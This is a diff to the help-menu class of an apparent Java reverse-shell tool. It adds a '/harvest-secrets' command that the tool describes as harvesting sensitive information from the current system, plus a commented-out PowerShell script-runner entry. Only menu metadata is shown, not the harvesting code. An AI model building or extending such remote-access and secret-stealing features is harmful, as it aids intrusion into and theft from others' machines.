@@ -1,16 +1,13 @@
 package com.mtattab.reverseshell.service.commands;
 
 import com.mtattab.reverseshell.service.Command;
-import com.mtattab.reverseshell.util.DataManipulationUtil;
-import com.mtattab.reverseshell.util.SystemCommandProxyUtil;
 import lombok.AllArgsConstructor;
 import lombok.Builder;
 import lombok.Data;
 import lombok.NoArgsConstructor;
 
-import java.io.File;
 import java.util.ArrayList;
-import java.util.List;
+
 @Data
 @AllArgsConstructor
 @NoArgsConstructor
@@ -69,6 +66,16 @@ public class HelpCommand implements Command {
                 .requiredParams("NA")
                 .example("powershell")
                 .build());
+        helpCommandArrayList.add(HelpCommand.builder().commandName("/harvest-secrets")
+                .description("Harvest sensitive information from current system")
+                .requiredParams("NA")
+                .example("/harvest-secrets")
+                .build());
+//        helpCommandArrayList.add(HelpCommand.builder().commandName("/power-script")
+//                .description("script name. Available scripts { pyDownload.ps1: 'download python in the system' }")
+//                .requiredParams("script name")
+//                .example("/power-script pyDownload.ps1")
+//                .build());
         helpCommandArrayList.add(HelpCommand.builder().commandName("/exit")
                 .description("Terminate shell")
                 .requiredParams("NA")
